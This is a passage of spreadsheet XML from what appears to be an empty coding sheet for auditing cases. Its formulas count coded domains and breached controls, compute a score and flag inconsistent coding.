  <conditionalFormatting sqref="AM2:AM224">
    <cfRule type="expression" priority="21" dxfId="1">
      <formula>LEN(AM2)&gt;0</formula>
    </cfRule>
  </conditionalFormatting>
  <dataValidations count="3">
    <dataValidation sqref="E2:L224 AH2:AH224" showDropDown="0" showInputMessage="0" showErrorMessage="1" allowBlank="1" error="Choose a value from the list" type="list">
      <formula1>"1,0"</formula1>
    </dataValidation>
    <dataValidation sqref="N2:AG224" showDropDown="0" showInputMessage="0" showErrorMessage="1" allowBlank="1" error="Choose a value from the list" type="list">
      <formula1>"1,0,NA"</formula1>
    </dataValidation>
    <dataValidation sqref="M2:M224" showDropDown="0" showInputMessage="0" showErrorMessage="1" allowBlank="1" error="Choose a value from the list" type="list">
      <formula1>"1,2,3,4,5,6,7,8"</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22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4" customWidth="1" min="3" max="3"/>
    <col width="42"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8"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7" customWidth="1" min="34" max="34"/>
    <col width="8" customWidth="1" min="35" max="35"/>
    <col width="8" customWidth="1" min="36" max="36"/>
    <col width="8" customWidth="1" min="37" max="37"/>
    <col width="8" customWidth="1" min="38" max="38"/>
    <col width="34" customWidth="1" min="39" max="39"/>
    <col width="6" customWidth="1" min="40" max="40"/>
    <col width="30" customWidth="1" min="41" max="41"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customHeight="1">
      <c r="A1" s="4" t="inlineStr">
        <is>
          <t>case_id</t>
        </is>
      </c>
      <c r="B1" s="4" t="inlineStr">
        <is>
          <t>batch</t>
        </is>
      </c>
      <c r="C1" s="4" t="inlineStr">
        <is>
          <t>product</t>
        </is>
      </c>
      <c r="D1" s="4" t="inlineStr">
        <is>
          <t>title</t>
        </is>
      </c>
      <c r="E1" s="4" t="inlineStr">
        <is>
          <t>d1</t>
        </is>
      </c>
      <c r="F1" s="4" t="inlineStr">
        <is>
          <t>d2</t>
        </is>
      </c>
      <c r="G1" s="4" t="inlineStr">
        <is>
          <t>d3</t>
        </is>
      </c>
      <c r="H1" s="4" t="inlineStr">
        <is>
          <t>d4</t>
        </is>
      </c>
      <c r="I1" s="4" t="inlineStr">
        <is>
          <t>d5</t>
        </is>
      </c>
      <c r="J1" s="4" t="inlineStr">
        <is>
          <t>d6</t>
        </is>
      </c>
      <c r="K1" s="4" t="inlineStr">
        <is>
          <t>d7</t>
        </is>
      </c>
      <c r="L1" s="4" t="inlineStr">
        <is>
          <t>d8</t>
        </is>
      </c>
      <c r="M1" s="4" t="inlineStr">
        <is>
          <t>primary_domain</t>
        </is>
      </c>
      <c r="N1" s="4" t="inlineStr">
        <is>
          <t>c01</t>
        </is>
      </c>
      <c r="O1" s="4" t="inlineStr">
        <is>
          <t>c02</t>
        </is>
      </c>
      <c r="P1" s="4" t="inlineStr">
        <is>
          <t>c03</t>
        </is>
      </c>
      <c r="Q1" s="4" t="inlineStr">
        <is>
          <t>c04</t>
        </is>
      </c>
      <c r="R1" s="4" t="inlineStr">
        <is>
          <t>c05</t>
        </is>
      </c>
      <c r="S1" s="4" t="inlineStr">
        <is>
          <t>c06</t>
        </is>
      </c>
      <c r="T1" s="4" t="inlineStr">
        <is>
          <t>c07</t>
        </is>
      </c>
      <c r="U1" s="4" t="inlineStr">
        <is>
          <t>c08</t>
        </is>
      </c>
      <c r="V1" s="4" t="inlineStr">
        <is>
          <t>c09</t>
        </is>
      </c>
      <c r="W1" s="4" t="inlineStr">
        <is>
          <t>c10</t>
        </is>
      </c>
      <c r="X1" s="4" t="inlineStr">
        <is>
          <t>c11</t>
        </is>
      </c>
      <c r="Y1" s="4" t="inlineStr">
        <is>
          <t>c12</t>
        </is>
      </c>
      <c r="Z1" s="4" t="inlineStr">
        <is>
          <t>c13</t>
        </is>
      </c>
      <c r="AA1" s="4" t="inlineStr">
        <is>
          <t>c14</t>
        </is>
      </c>
      <c r="AB1" s="4" t="inlineStr">
        <is>
          <t>c15</t>
        </is>
      </c>
      <c r="AC1" s="4" t="inlineStr">
        <is>
          <t>c16</t>
        </is>
      </c>
      <c r="AD1" s="4" t="inlineStr">
        <is>
          <t>c17</t>
        </is>
      </c>
      <c r="AE1" s="4" t="inlineStr">
        <is>
          <t>c18</t>
        </is>
      </c>
      <c r="AF1" s="4" t="inlineStr">
        <is>
          <t>c19</t>
        </is>
      </c>
      <c r="AG1" s="4" t="inlineStr">
        <is>
          <t>c20</t>
        </is>
      </c>
      <c r="AH1" s="4" t="inlineStr">
        <is>
          <t>covered</t>
        </is>
      </c>
      <c r="AI1" s="4" t="inlineStr">
        <is>
          <t>n_domains</t>
        </is>
      </c>
      <c r="AJ1" s="4" t="inlineStr">
        <is>
          <t>n_applicable</t>
        </is>
      </c>
      <c r="AK1" s="4" t="inlineStr">
        <is>
          <t>n_breached</t>
        </is>
      </c>
      <c r="AL1" s="4" t="inlineStr">
        <is>
          <t>gcs</t>
        </is>
      </c>
      <c r="AM1" s="4" t="inlineStr">
        <is>
          <t>check</t>
        </is>
      </c>
      <c r="AN1" s="4" t="inlineStr">
        <is>
          <t>done</t>
        </is>
      </c>
      <c r="AO1" s="4" t="inlineStr">
        <is>
          <t>notes</t>
        </is>
      </c>
    </row>
    <row r="2">
      <c r="A2" s="11">
        <f>Cases!A2</f>
        <v/>
      </c>
      <c r="B2" s="11">
        <f>Cases!B2</f>
        <v/>
      </c>
      <c r="C2" s="11">
        <f>Cases!C2</f>
        <v/>
      </c>
      <c r="D2" s="11">
        <f>IF(Cases!F2="",LEFT(Cases!G2,120),Cases!F2)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E2:L2)=0,"",SUM(E2:L2))</f>
        <v/>
      </c>
      <c r="AJ2" s="13">
        <f>IF(AI2="","",N(E2)*3+N(F2)*2+N(G2)*2+N(H2)*2+N(I2)*2+N(J2)*3+N(K2)*3+N(L2)*3)</f>
        <v/>
      </c>
      <c r="AK2" s="13">
        <f>IF(AI2="","",COUNTIF(N2:AG2,1))</f>
        <v/>
      </c>
      <c r="AL2" s="13">
        <f>IF(OR(AJ2="",AJ2=0),"",ROUND(100*(AJ2-AK2)/AJ2,1))</f>
        <v/>
      </c>
      <c r="AM2" s="11">
        <f>IF(AI2="","",IF(AI2=0,"No domain coded 1; ","")&amp;IF(M2="","Primary domain missing; ",IF(IFERROR(INDEX(E2:L2,1,M2),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N2:AG2)&lt;&gt;AJ2,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH2="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN2" s="13">
        <f>IF(AND(AI2&lt;&gt;"",AM2=""),1,0)</f>
        <v/>
      </c>
      <c r="AO2" s="14" t="n"/>
    </row>
    <row r="3">
      <c r="A3" s="11">
        <f>Cases!A3</f>
        <v/>
      </c>
      <c r="B3" s="11">
        <f>Cases!B3</f>
        <v/>
      </c>
      <c r="C3" s="11">
        <f>Cases!C3</f>
        <v/>
      </c>
      <c r="D3" s="11">
        <f>IF(Cases!F3="",LEFT(Cases!G3,120),Cases!F3)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E3:L3)=0,"",SUM(E3:L3))</f>
        <v/>
      </c>
      <c r="AJ3" s="13">
        <f>IF(AI3="","",N(E3)*3+N(F3)*2+N(G3)*2+N(H3)*2+N(I3)*2+N(J3)*3+N(K3)*3+N(L3)*3)</f>
        <v/>
      </c>
      <c r="AK3" s="13">
        <f>IF(AI3="","",COUNTIF(N3:AG3,1))</f>
        <v/>
      </c>
      <c r="AL3" s="13">
        <f>IF(OR(AJ3="",AJ3=0),"",ROUND(100*(AJ3-AK3)/AJ3,1))</f>
        <v/>
      </c>
      <c r="AM3" s="11">
        <f>IF(AI3="","",IF(AI3=0,"No domain coded 1; ","")&amp;IF(M3="","Primary domain missing; ",IF(IFERROR(INDEX(E3:L3,1,M3),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N3:AG3)&lt;&gt;AJ3,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH3="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN3" s="13">
        <f>IF(AND(AI3&lt;&gt;"",AM3=""),1,0)</f>
        <v/>
      </c>
      <c r="AO3" s="14" t="n"/>
    </row>
    <row r="4">
      <c r="A4" s="11">
        <f>Cases!A4</f>
        <v/>
      </c>
      <c r="B4" s="11">
        <f>Cases!B4</f>
        <v/>
      </c>
      <c r="C4" s="11">
        <f>Cases!C4</f>
        <v/>
      </c>
      <c r="D4" s="11">
        <f>IF(Cases!F4="",LEFT(Cases!G4,120),Cases!F4)</f>
        <v/>
      </c>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c r="AH4" s="12" t="n"/>
      <c r="AI4" s="13">
        <f>IF(COUNT(E4:L4)=0,"",SUM(E4:L4))</f>
        <v/>
      </c>
      <c r="AJ4" s="13">
        <f>IF(AI4="","",N(E4)*3+N(F4)*2+N(G4)*2+N(H4)*2+N(I4)*2+N(J4)*3+N(K4)*3+N(L4)*3)</f>
        <v/>
      </c>
      <c r="AK4" s="13">
        <f>IF(AI4="","",COUNTIF(N4:AG4,1))</f>
        <v/>
      </c>
      <c r="AL4" s="13">
        <f>IF(OR(AJ4="",AJ4=0),"",ROUND(100*(AJ4-AK4)/AJ4,1))</f>
        <v/>
      </c>
      <c r="AM4" s="11">
        <f>IF(AI4="","",IF(AI4=0,"No domain coded 1; ","")&amp;IF(M4="","Primary domain missing; ",IF(IFERROR(INDEX(E4:L4,1,M4),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N4:AG4)&lt;&gt;AJ4,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH4="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN4" s="13">
        <f>IF(AND(AI4&lt;&gt;"",AM4=""),1,0)</f>
        <v/>
      </c>
      <c r="AO4" s="14" t="n"/>
    </row>
    <row r="5">
      <c r="A5" s="11">
        <f>Cases!A5</f>
        <v/>
      </c>
      <c r="B5" s="11">
        <f>Cases!B5</f>
        <v/>
      </c>
      <c r="C5" s="11">
        <f>Cases!C5</f>
        <v/>
      </c>
      <c r="D5" s="11">
        <f>IF(Cases!F5="",LEFT(Cases!G5,120),Cases!F5)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E5:L5)=0,"",SUM(E5:L5))</f>
        <v/>
      </c>
      <c r="AJ5" s="13">
        <f>IF(AI5="","",N(E5)*3+N(F5)*2+N(G5)*2+N(H5)*2+N(I5)*2+N(J5)*3+N(K5)*3+N(L5)*3)</f>
        <v/>
      </c>
      <c r="AK5" s="13">
        <f>IF(AI5="","",COUNTIF(N5:AG5,1))</f>
        <v/>
      </c>
      <c r="AL5" s="13">
        <f>IF(OR(AJ5="",AJ5=0),"",ROUND(100*(AJ5-AK5)/AJ5,1))</f>
        <v/>
      </c>
      <c r="AM5" s="11">
        <f>IF(AI5="","",IF(AI5=0,"No domain coded 1; ","")&amp;IF(M5="","Primary domain missing; ",IF(IFERROR(INDEX(E5:L5,1,M5),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N5:AG5)&lt;&gt;AJ5,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH5="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN5" s="13">
        <f>IF(AND(AI5&lt;&gt;"",AM5=""),1,0)</f>
        <v/>
      </c>
      <c r="AO5" s="14" t="n"/>
    </row>
    <row r="6">
      <c r="A6" s="11">
        <f>Cases!A6</f>
        <v/>
      </c>
      <c r="B6" s="11">
        <f>Cases!B6</f>
        <v/>
      </c>
      <c r="C6" s="11">
        <f>Cases!C6</f>
        <v/>
      </c>
      <c r="D6" s="11">
        <f>IF(Cases!F6="",LEFT(Cases!G6,120),Cases!F6)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E6:L6)=0,"",SUM(E6:L6))</f>
        <v/>
      </c>
      <c r="AJ6" s="13">
        <f>IF(AI6="","",N(E6)*3+N(F6)*2+N(G6)*2+N(H6)*2+N(I6)*2+N(J6)*3+N(K6)*3+N(L6)*3)</f>
        <v/>
      </c>
      <c r="AK6" s="13">
        <f>IF(AI6="","",COUNTIF(N6:AG6,1))</f>
        <v/>
      </c>
      <c r="AL6" s="13">
        <f>IF(OR(AJ6="",AJ6=0),"",ROUND(100*(AJ6-AK6)/AJ6,1))</f>
        <v/>
      </c>
      <c r="AM6" s="11">
        <f>IF(AI6="","",IF(AI6=0,"No domain coded 1; ","")&amp;IF(M6="","Primary domain missing; ",IF(IFERROR(INDEX(E6:L6,1,M6),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N6:AG6)&lt;&gt;AJ6,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH6="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN6" s="13">
        <f>IF(AND(AI6&lt;&gt;"",AM6=""),1,0)</f>
        <v/>
      </c>
      <c r="AO6" s="14" t="n"/>
    </row>
    <row r="7">
      <c r="A7" s="11">
        <f>Cases!A7</f>
        <v/>
      </c>
      <c r="B7" s="11">
        <f>Cases!B7</f>
        <v/>
      </c>
      <c r="C7" s="11">
        <f>Cases!C7</f>
        <v/>
      </c>
      <c r="D7" s="11">
        <f>IF(Cases!F7="",LEFT(Cases!G7,120),Cases!F7)</f>
        <v/>
      </c>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c r="AA7" s="12" t="n"/>
      <c r="AB7" s="12" t="n"/>
      <c r="AC7" s="12" t="n"/>
      <c r="AD7" s="12" t="n"/>
      <c r="AE7" s="12" t="n"/>
      <c r="AF7" s="12" t="n"/>
      <c r="AG7" s="12" t="n"/>
      <c r="AH7" s="12" t="n"/>
      <c r="AI7" s="13">
        <f>IF(COUNT(E7:L7)=0,"",SUM(E7:L7))</f>
        <v/>
      </c>
      <c r="AJ7" s="13">
        <f>IF(AI7="","",N(E7)*3+N(F7)*2+N(G7)*2+N(H7)*2+N(I7)*2+N(J7)*3+N(K7)*3+N(L7)*3)</f>
        <v/>
      </c>
      <c r="AK7" s="13">
        <f>IF(AI7="","",COUNTIF(N7:AG7,1))</f>
        <v/>
      </c>
      <c r="AL7" s="13">
        <f>IF(OR(AJ7="",AJ7=0),"",ROUND(100*(AJ7-AK7)/AJ7,1))</f>
        <v/>
      </c>
      <c r="AM7" s="11">
        <f>IF(AI7="","",IF(AI7=0,"No domain coded 1; ","")&amp;IF(M7="","Primary domain missing; ",IF(IFERROR(INDEX(E7:L7,1,M7),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N7:AG7)&lt;&gt;AJ7,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH7="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN7" s="13">
        <f>IF(AND(AI7&lt;&gt;"",AM7=""),1,0)</f>
        <v/>
      </c>
      <c r="AO7" s="14" t="n"/>
    </row>
    <row r="8">
      <c r="A8" s="11">
        <f>Cases!A8</f>
        <v/>
      </c>
      <c r="B8" s="11">
        <f>Cases!B8</f>
        <v/>
      </c>
      <c r="C8" s="11">
        <f>Cases!C8</f>
        <v/>
      </c>
      <c r="D8" s="11">
        <f>IF(Cases!F8="",LEFT(Cases!G8,120),Cases!F8)</f>
        <v/>
      </c>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c r="AD8" s="12" t="n"/>
      <c r="AE8" s="12" t="n"/>
      <c r="AF8" s="12" t="n"/>
      <c r="AG8" s="12" t="n"/>
      <c r="AH8" s="12" t="n"/>
      <c r="AI8" s="13">
        <f>IF(COUNT(E8:L8)=0,"",SUM(E8:L8))</f>
        <v/>
      </c>
      <c r="AJ8" s="13">
        <f>IF(AI8="","",N(E8)*3+N(F8)*2+N(G8)*2+N(H8)*2+N(I8)*2+N(J8)*3+N(K8)*3+N(L8)*3)</f>
        <v/>
      </c>
      <c r="AK8" s="13">
        <f>IF(AI8="","",COUNTIF(N8:AG8,1))</f>
        <v/>
      </c>
      <c r="AL8" s="13">
        <f>IF(OR(AJ8="",AJ8=0),"",ROUND(100*(AJ8-AK8)/AJ8,1))</f>
        <v/>
      </c>
      <c r="AM8" s="11">
        <f>IF(AI8="","",IF(AI8=0,"No domain coded 1; ","")&amp;IF(M8="","Primary domain missing; ",IF(IFERROR(INDEX(E8:L8,1,M8),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N8:AG8)&lt;&gt;AJ8,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH8="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN8" s="13">
        <f>IF(AND(AI8&lt;&gt;"",AM8=""),1,0)</f>
        <v/>
      </c>
      <c r="AO8" s="14" t="n"/>
    </row>
    <row r="9">
      <c r="A9" s="11">
        <f>Cases!A9</f>
        <v/>
      </c>
      <c r="B9" s="11">
        <f>Cases!B9</f>
        <v/>
      </c>
      <c r="C9" s="11">
        <f>Cases!C9</f>
        <v/>
      </c>
      <c r="D9" s="11">
        <f>IF(Cases!F9="",LEFT(Cases!G9,120),Cases!F9)</f>
        <v/>
      </c>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c r="AA9" s="12" t="n"/>
      <c r="AB9" s="12" t="n"/>
      <c r="AC9" s="12" t="n"/>
      <c r="AD9" s="12" t="n"/>
      <c r="AE9" s="12" t="n"/>
      <c r="AF9" s="12" t="n"/>
      <c r="AG9" s="12" t="n"/>
      <c r="AH9" s="12" t="n"/>
      <c r="AI9" s="13">
        <f>IF(COUNT(E9:L9)=0,"",SUM(E9:L9))</f>
        <v/>
      </c>
      <c r="AJ9" s="13">
        <f>IF(AI9="","",N(E9)*3+N(F9)*2+N(G9)*2+N(H9)*2+N(I9)*2+N(J9)*3+N(K9)*3+N(L9)*3)</f>
        <v/>
      </c>
      <c r="AK9" s="13">
        <f>IF(AI9="","",COUNTIF(N9:AG9,1))</f>
        <v/>
      </c>
      <c r="AL9" s="13">
        <f>IF(OR(AJ9="",AJ9=0),"",ROUND(100*(AJ9-AK9)/AJ9,1))</f>
        <v/>
      </c>
      <c r="AM9" s="11">
        <f>IF(AI9="","",IF(AI9=0,"No domain coded 1; ","")&amp;IF(M9="","Primary domain missing; ",IF(IFERROR(INDEX(E9:L9,1,M9),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N9:AG9)&lt;&gt;AJ9,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH9="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN9" s="13">
        <f>IF(AND(AI9&lt;&gt;"",AM9=""),1,0)</f>
        <v/>
      </c>
      <c r="AO9" s="14" t="n"/>
    </row>
    <row r="10">
      <c r="A10" s="11">
        <f>Cases!A10</f>
        <v/>
      </c>
      <c r="B10" s="11">
        <f>Cases!B10</f>
        <v/>
      </c>
      <c r="C10" s="11">
        <f>Cases!C10</f>
        <v/>
      </c>
      <c r="D10" s="11">
        <f>IF(Cases!F10="",LEFT(Cases!G10,120),Cases!F10)</f>
        <v/>
      </c>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c r="AI10" s="13">
        <f>IF(COUNT(E10:L10)=0,"",SUM(E10:L10))</f>
        <v/>
      </c>
      <c r="AJ10" s="13">
        <f>IF(AI10="","",N(E10)*3+N(F10)*2+N(G10)*2+N(H10)*2+N(I10)*2+N(J10)*3+N(K10)*3+N(L10)*3)</f>
        <v/>
      </c>
      <c r="AK10" s="13">
        <f>IF(AI10="","",COUNTIF(N10:AG10,1))</f>
        <v/>
      </c>
      <c r="AL10" s="13">
        <f>IF(OR(AJ10="",AJ10=0),"",ROUND(100*(AJ10-AK10)/AJ10,1))</f>
        <v/>
      </c>
      <c r="AM10" s="11">
        <f>IF(AI10="","",IF(AI10=0,"No domain coded 1; ","")&amp;IF(M10="","Primary domain missing; ",IF(IFERROR(INDEX(E10:L10,1,M10),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N10:AG10)&lt;&gt;AJ10,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH10="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN10" s="13">
        <f>IF(AND(AI10&lt;&gt;"",AM10=""),1,0)</f>
        <v/>
      </c>
      <c r="AO10" s="14" t="n"/>
    </row>
    <row r="11">
      <c r="A11" s="11">
        <f>Cases!A11</f>
        <v/>
      </c>
      <c r="B11" s="11">
        <f>Cases!B11</f>
        <v/>
      </c>
      <c r="C11" s="11">
        <f>Cases!C11</f>
        <v/>
      </c>
      <c r="D11" s="11">
        <f>IF(Cases!F11="",LEFT(Cases!G11,120),Cases!F11)</f>
        <v/>
      </c>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c r="AD11" s="12" t="n"/>
      <c r="AE11" s="12" t="n"/>
      <c r="AF11" s="12" t="n"/>
      <c r="AG11" s="12" t="n"/>
      <c r="AH11" s="12" t="n"/>
      <c r="AI11" s="13">
        <f>IF(COUNT(E11:L11)=0,"",SUM(E11:L11))</f>
        <v/>
      </c>
      <c r="AJ11" s="13">
        <f>IF(AI11="","",N(E11)*3+N(F11)*2+N(G11)*2+N(H11)*2+N(I11)*2+N(J11)*3+N(K11)*3+N(L11)*3)</f>
        <v/>
      </c>
      <c r="AK11" s="13">
        <f>IF(AI11="","",COUNTIF(N11:AG11,1))</f>
        <v/>
      </c>
      <c r="AL11" s="13">
        <f>IF(OR(AJ11="",AJ11=0),"",ROUND(100*(AJ11-AK11)/AJ11,1))</f>
        <v/>
      </c>
      <c r="AM11" s="11">
        <f>IF(AI11="","",IF(AI11=0,"No domain coded 1; ","")&amp;IF(M11="","Primary domain missing; ",IF(IFERROR(INDEX(E11:L11,1,M11),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N11:AG11)&lt;&gt;AJ11,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH11="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN11" s="13">
        <f>IF(AND(AI11&lt;&gt;"",AM11=""),1,0)</f>
        <v/>
      </c>
      <c r="AO11" s="14" t="n"/>
    </row>
    <row r="12">
      <c r="A12" s="11">
        <f>Cases!A12</f>
        <v/>
      </c>
      <c r="B12" s="11">
        <f>Cases!B12</f>
        <v/>
      </c>
      <c r="C12" s="11">
        <f>Cases!C12</f>
        <v/>
      </c>
      <c r="D12" s="11">
        <f>IF(Cases!F12="",LEFT(Cases!G12,120),Cases!F12)</f>
        <v/>
      </c>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c r="AC12" s="12" t="n"/>
      <c r="AD12" s="12" t="n"/>
      <c r="AE12" s="12" t="n"/>
      <c r="AF12" s="12" t="n"/>
      <c r="AG12" s="12" t="n"/>
      <c r="AH12" s="12" t="n"/>
      <c r="AI12" s="13">
        <f>IF(COUNT(E12:L12)=0,"",SUM(E12:L12))</f>
        <v/>
      </c>
      <c r="AJ12" s="13">
        <f>IF(AI12="","",N(E12)*3+N(F12)*2+N(G12)*2+N(H12)*2+N(I12)*2+N(J12)*3+N(K12)*3+N(L12)*3)</f>
        <v/>
      </c>
      <c r="AK12" s="13">
        <f>IF(AI12="","",COUNTIF(N12:AG12,1))</f>
        <v/>
      </c>
      <c r="AL12" s="13">
        <f>IF(OR(AJ12="",AJ12=0),"",ROUND(100*(AJ12-AK12)/AJ12,1))</f>
        <v/>
      </c>
      <c r="AM12" s="11">
        <f>IF(AI12="","",IF(AI12=0,"No domain coded 1; ","")&amp;IF(M12="","Primary domain missing; ",IF(IFERROR(INDEX(E12:L12,1,M12),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N12:AG12)&lt;&gt;AJ12,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH12="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN12" s="13">
        <f>IF(AND(AI12&lt;&gt;"",AM12=""),1,0)</f>
        <v/>
      </c>
      <c r="AO12" s="14" t="n"/>
    </row>
    <row r="13">
      <c r="A13" s="11">
        <f>Cases!A13</f>
        <v/>
      </c>
      <c r="B13" s="11">
        <f>Cases!B13</f>
        <v/>
      </c>
      <c r="C13" s="11">
        <f>Cases!C13</f>
        <v/>
      </c>
      <c r="D13" s="11">
        <f>IF(Cases!F13="",LEFT(Cases!G13,120),Cases!F13)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E13:L13)=0,"",SUM(E13:L13))</f>
        <v/>
      </c>
      <c r="AJ13" s="13">
        <f>IF(AI13="","",N(E13)*3+N(F13)*2+N(G13)*2+N(H13)*2+N(I13)*2+N(J13)*3+N(K13)*3+N(L13)*3)</f>
        <v/>
      </c>
      <c r="AK13" s="13">
        <f>IF(AI13="","",COUNTIF(N13:AG13,1))</f>
        <v/>
      </c>
      <c r="AL13" s="13">
        <f>IF(OR(AJ13="",AJ13=0),"",ROUND(100*(AJ13-AK13)/AJ13,1))</f>
        <v/>
      </c>
      <c r="AM13" s="11">
        <f>IF(AI13="","",IF(AI13=0,"No domain coded 1; ","")&amp;IF(M13="","Primary domain missing; ",IF(IFERROR(INDEX(E13:L13,1,M13),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N13:AG13)&lt;&gt;AJ13,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH13="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN13" s="13">
        <f>IF(AND(AI13&lt;&gt;"",AM13=""),1,0)</f>
        <v/>
      </c>
      <c r="AO13" s="14" t="n"/>
    </row>
    <row r="14">
      <c r="A14" s="11">
        <f>Cases!A14</f>
        <v/>
      </c>
      <c r="B14" s="11">
        <f>Cases!B14</f>
        <v/>
      </c>
      <c r="C14" s="11">
        <f>Cases!C14</f>
        <v/>
      </c>
      <c r="D14" s="11">
        <f>IF(Cases!F14="",LEFT(Cases!G14,120),Cases!F14)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E14:L14)=0,"",SUM(E14:L14))</f>
        <v/>
      </c>
      <c r="AJ14" s="13">
        <f>IF(AI14="","",N(E14)*3+N(F14)*2+N(G14)*2+N(H14)*2+N(I14)*2+N(J14)*3+N(K14)*3+N(L14)*3)</f>
        <v/>
      </c>
      <c r="AK14" s="13">
        <f>IF(AI14="","",COUNTIF(N14:AG14,1))</f>
        <v/>
      </c>
      <c r="AL14" s="13">
        <f>IF(OR(AJ14="",AJ14=0),"",ROUND(100*(AJ14-AK14)/AJ14,1))</f>
        <v/>
      </c>
      <c r="AM14" s="11">
        <f>IF(AI14="","",IF(AI14=0,"No domain coded 1; ","")&amp;IF(M14="","Primary domain missing; ",IF(IFERROR(INDEX(E14:L14,1,M14),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N14:AG14)&lt;&gt;AJ14,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH14="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN14" s="13">
        <f>IF(AND(AI14&lt;&gt;"",AM14=""),1,0)</f>
        <v/>
      </c>
      <c r="AO14" s="14" t="n"/>
    </row>
    <row r="15">
      <c r="A15" s="11">
        <f>Cases!A15</f>
        <v/>
      </c>
      <c r="B15" s="11">
        <f>Cases!B15</f>
        <v/>
      </c>
      <c r="C15" s="11">
        <f>Cases!C15</f>
        <v/>
      </c>
      <c r="D15" s="11">
        <f>IF(Cases!F15="",LEFT(Cases!G15,120),Cases!F15)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E15:L15)=0,"",SUM(E15:L15))</f>
        <v/>
      </c>
      <c r="AJ15" s="13">
        <f>IF(AI15="","",N(E15)*3+N(F15)*2+N(G15)*2+N(H15)*2+N(I15)*2+N(J15)*3+N(K15)*3+N(L15)*3)</f>
        <v/>
      </c>
      <c r="AK15" s="13">
        <f>IF(AI15="","",COUNTIF(N15:AG15,1))</f>
        <v/>
      </c>
      <c r="AL15" s="13">
        <f>IF(OR(AJ15="",AJ15=0),"",ROUND(100*(AJ15-AK15)/AJ15,1))</f>
        <v/>
      </c>
      <c r="AM15" s="11">
        <f>IF(AI15="","",IF(AI15=0,"No domain coded 1; ","")&amp;IF(M15="","Primary domain missing; ",IF(IFERROR(INDEX(E15:L15,1,M15),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N15:AG15)&lt;&gt;AJ15,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH15="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN15" s="13">
        <f>IF(AND(AI15&lt;&gt;"",AM15=""),1,0)</f>
        <v/>
      </c>
      <c r="AO15" s="14" t="n"/>
    </row>
    <row r="16">
      <c r="A16" s="11">
        <f>Cases!A16</f>
        <v/>
      </c>
      <c r="B16" s="11">
        <f>Cases!B16</f>
        <v/>
      </c>
      <c r="C16" s="11">
        <f>Cases!C16</f>
        <v/>
      </c>
      <c r="D16" s="11">
        <f>IF(Cases!F16="",LEFT(Cases!G16,120),Cases!F16)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E16:L16)=0,"",SUM(E16:L16))</f>
        <v/>
      </c>
      <c r="AJ16" s="13">
        <f>IF(AI16="","",N(E16)*3+N(F16)*2+N(G16)*2+N(H16)*2+N(I16)*2+N(J16)*3+N(K16)*3+N(L16)*3)</f>
        <v/>
      </c>
      <c r="AK16" s="13">
        <f>IF(AI16="","",COUNTIF(N16:AG16,1))</f>
        <v/>
      </c>
      <c r="AL16" s="13">
        <f>IF(OR(AJ16="",AJ16=0),"",ROUND(100*(AJ16-AK16)/AJ16,1))</f>
        <v/>
      </c>
      <c r="AM16" s="11">
